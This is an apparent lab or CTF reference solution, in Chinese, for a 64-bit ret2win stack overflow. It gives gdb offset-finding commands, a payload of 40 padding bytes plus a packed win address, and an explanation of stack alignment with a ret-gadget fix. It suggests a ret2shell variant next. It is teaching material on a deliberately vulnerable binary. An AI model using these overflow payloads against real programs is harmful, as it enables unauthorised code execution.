# 参考解法说明 — 64 位 ret2win

## 与 32 位的差异(本关考点)

| | 32 位 | 64 位 |
|---|---|---|
| 地址长度 | 4 字节 `struct '<I'` | 8 字节 `struct '<Q'` |
| 偏移(buf[16]) | 32 | **40**(saved rbp 由 4→8) |
| 栈对齐 | 无要求 | `call` 时 rsp%16==0,否则 libc 内 movaps 崩 |

## 推导

```bash
gcc -g -O0 -fno-stack-protector -no-pie vuln.c -o vuln   # 64 位
gdb -q ./vuln
gef> pattern create 80
gef> run                       # 喂入崩溃
gef> pattern offset $rsp       # → 40
nm vuln | grep ' T win'        # → 0x4004a6
```

payload:`b"A"*40 + struct.pack("<Q", 0x4004a6)`,`python3 exploit.py | ./vuln`。

## 关于栈对齐(关键概念,即使本关没触发)

64 位 System V ABI:进入函数瞬间(call 刚压完返回地址)`rsp % 16 == 8`,
等价于执行 `call` 前 `rsp % 16 == 0`。glibc 里用 SSE 的函数(`system` 必中,
`printf`/`puts` 视路径)会执行 `movaps [rsp+x], xmm0`,**未对齐直接 #GP 崩溃**,
崩溃地址落在 libc 内部(不是你的代码)——这是 64 位特有的迷惑现象。

**本关为什么没崩**:`win()` 只调 `puts` 再 `exit`,在当前栈布局下进入时恰好对齐。
若把目标换成 `system("/bin/sh")`,几乎必然触发对齐崩溃。

**通用修复**:在目标地址前垫一个**裸 `ret` gadget**,多 pop 一次返回地址、
让 rsp 多偏 8 字节,把对齐补回来:

```python
RET = 0x400356   # objdump -d vuln | grep -m1 'c3 *ret'
payload = b"A"*40 + struct.pack("<Q", RET) + struct.pack("<Q", WIN)
```

**怎么判断是不是对齐问题**:

```bash
gdb -q ./vuln -ex 'break *win地址' -ex 'run < payload' -ex 'p $rsp & 0xf'
# 进入 win 时低 4 位应为 0x8;若为 0x0,说明差 8 字节 → 加一个 ret gadget
```

## 再进阶
把本关改成 64 位 ret2shell(`system("/bin/sh")`),亲手触发并修掉对齐崩溃,
这是体会该坑最直接的方式。
